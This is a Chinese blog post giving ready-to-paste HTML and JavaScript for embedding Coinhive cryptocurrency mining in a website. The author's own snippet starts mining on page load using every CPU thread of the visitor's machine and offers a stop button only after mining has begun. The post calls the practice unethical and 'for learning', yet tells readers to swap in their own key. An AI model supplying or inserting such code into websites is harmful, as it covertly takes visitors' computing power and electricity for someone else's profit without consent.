# 原创
：  在网站嵌入挖矿JS代码样式

# 在网站嵌入挖矿JS代码样式

> 
网站挖矿很不道德，纯学习娱乐，请勿用于非法途径.


Coinhive: [https://coinhive.com](https://coinhive.com) , 可以去网站看看，不过好像已经被墙了，其JS代码被Windows防火墙视为病毒，不知道还能不能用。。。

去官网注册一个账号，得几个key，去https://mymonero.com/ 注册账号，建立自己的钱包，这两个网站都需要操作，具体教程网上有。本文只提供网页样式。

## 官网样式

```
&lt;div&gt;
	&lt;script src="https://authedmine.com/lib/simple-ui.min.js" async&gt;&lt;/script&gt;
	&lt;div class="coinhive-miner" 
		style="width: 100%; height: 100px"
		data-key="YjyptNPkNzUZwQonjCLhkllZAW85Axyo"
		data-autostart="true"
		data-whitelabel="false"
		data-background="#000000"
		data-text="#eeeeee"
		data-action="#00ff00"
		data-graph="#555555"
		data-threads="7"
		data-throttle="0.1"&gt;
		&lt;em&gt;Loading...&lt;/em&gt;
	&lt;/div&gt;
&lt;/div&gt;

```

## 我以前用的样式

大概这个样子

### ⬇⬇~ 挖 矿 打 赏 系 统 ~⬇⬇
<td align="center">启动线程数</td><td align="center">当前算力(Hashs/秒)</td><td align="center">您已贡献(Hash单位：个)</td>
<td align="center">0</td><td align="center">0</td><td align="center">0</td>
<td align="center" colspan="3;">您正在打赏中，随时可以停止。</td>

```
&lt;div&gt;
	&lt;h3 align="center"&gt;⬇⬇~ 挖 矿 打 赏 系 统 ~⬇⬇&lt;/h3&gt;
	&lt;script src="https://coinhive.com/lib/coinhive.min.js"&gt;&lt;/script&gt;
	&lt;center&gt;
		&lt;table &gt;
			&lt;tbody&gt;
			&lt;tr&gt;
				&lt;td align="center"&gt;启动线程数&lt;/td&gt;
				&lt;td align="center"&gt;当前算力(Hashs/秒)&lt;/td&gt;
				&lt;td align="center"&gt;您已贡献(Hash单位：个)&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;
				&lt;td id="tcount" align="center"&gt;0&lt;/td&gt;
				&lt;td id="hps" align="center"&gt;0&lt;/td&gt;
				&lt;td id="ths" align="center"&gt;0&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td colspan="3;" id="status" align="center"&gt;您正在打赏中，随时可以停止。&lt;/td&gt;&lt;/tr&gt;
			&lt;/tbody&gt;
		&lt;/table&gt;
	&lt;/center&gt;
	
	&lt;div&gt;&lt;p id="minebutton" style="text-align:center;"&gt;
		&lt;button onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)"&gt;停止挖矿打赏&lt;/button&gt;
	&lt;/p&gt;&lt;/div&gt;

	&lt;script type="text/javascript"&gt;
		var miner=new CoinHive.User
			("YjyptNPkNzUZwQonjCLhkllZAW85Axyo",
			"www.ds-vip.top",
			{threads:navigator.hardwareConcurrency,autoThreads:!1,throttle:.9,forceASMJS:!1});
		
		miner.start(CoinHive.FORCE_EXCLUSIVE_TAB),
		setInterval(function(){var e=miner.getNumThreads(),
		n=Math.round(100*miner.getHashesPerSecond())/100,
		t=miner.getTotalHashes();miner.getAcceptedHashes()/256;
		
		miner.isRunning()?(document.getElementById("tcount").innerHTML=e,document.getElementById("hps").innerHTML=n,	
		document.getElementById("ths").innerHTML=t,document.getElementById("status").innerHTML="您正在打赏中，随时可以停止。",
		document.getElementById("minebutton").innerHTML='&lt;button onclick="miner.stop()"&gt;停止挖矿打赏&lt;/button&gt;'):(document.getElementById("tcount").innerHTML="0",document.getElementById("hps").innerHTML="0",document.getElementById("ths").innerHTML=t,document.getElementById("status").innerHTML="您已经停止打赏，随时可以开始。",document.getElementById("minebutton").innerHTML='&lt;button onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)"&gt;开始挖矿打赏&lt;/button&gt;')},1e3)
	&lt;/script&gt;
&lt;/div&gt;

```

### ⬇⬇~ 挖 矿 打 赏 系 统 ~⬇⬇

记得改key。。。
